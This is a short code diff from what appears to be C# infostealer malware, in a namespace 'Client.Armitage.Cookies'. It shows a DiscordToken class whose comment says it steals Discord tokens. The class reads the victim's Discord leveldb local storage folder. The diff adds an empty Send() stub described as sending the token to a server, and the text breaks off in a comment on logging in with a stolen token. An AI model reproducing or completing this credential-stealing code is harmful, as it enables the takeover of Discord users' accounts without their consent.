@@ -9,12 +9,12 @@ using System.Threading.Tasks;
 
 namespace Client.Armitage.Cookies
 {
-    public static class DiscordToken
+    public class DiscordToken
     {
         /// <summary>
         /// Steals discord token from the Windows app.
         /// </summary>
-        public static List<string> Stealu() {
+        public List<string> Stealu() {
 
             List<string> discordtokens = new List<string>();
             DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
@@ -34,6 +34,14 @@ namespace Client.Armitage.Cookies
 
             return discordtokens.ToList();
         }
+
+        /// <summary>
+        /// Sends the discord token to the server.
+        /// </summary>
+        public void Send() { 
+        
+        }
+
         /*
         To log in:
             Open Debug on browser.
